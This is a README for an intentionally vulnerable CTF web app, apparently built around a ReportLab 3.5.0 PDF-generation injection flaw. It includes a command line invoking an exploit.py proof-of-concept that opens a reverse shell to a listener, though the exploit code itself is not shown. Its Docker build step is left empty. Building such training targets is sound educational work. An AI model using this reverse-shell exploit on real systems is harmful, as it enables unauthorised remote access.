# Daily Diary

**Daily Diary** is a web application written in Python using the ReportLab library. It is an intentionally vulnerable app created for educational purposes, particularly for cybersecurity training. The app contains a critical vulnerability related to user-controlled input in PDF generation, which can be exploited for malicious purposes.

This app was initially created by me for the WeShieldCyber CTF Event qualifiers, but I decided to make it public so that everyone can access it and learn from it.

## Setup

### Prerequisites

- Docker Engine installed on your system.

---

### Deployment Using Docker

1. **Clone the Repository:**
   ```bash
   git clone https://github.com/Rezy-Dev/Daily-Diary.git
   cd Daily-Diary
   ```

2. **Build the Docker Image:**

## Note on Vulnerability

Since you are exploring this app for educational purposes, it’s important to understand the potential risks of insecure code practices. For instance, this app uses the ReportLab library (version `3.5.0`) for PDF generation. Improper sanitization of user input in this process can lead to unintended consequences. Learn more about this type of vulnerability in the following article:

- [ReportLab Vulnerabilities in Web Applications](https://rezydev.xyz/research/) - *i have not published the blog on this yet*
- Use `exploit.py` script on this repository using following switches for reverse shell. It's a PoC Script.

```bash
# python3 exploit.py http://ip:port username password docker0-interface listening-port
python3 exploit.py http://localhost:3003 rezydev rezydev 172.17.0.1 1337
```

## License

License? What is this, a driver's license? A drinking license? Do we even need one here???

Well, technically, yes. There is a [MIT License](https://github.com/Rezy-Dev/Daily-Diary/blob/main/LICENSE) (but don’t worry, it’s not as complicated as it sounds).
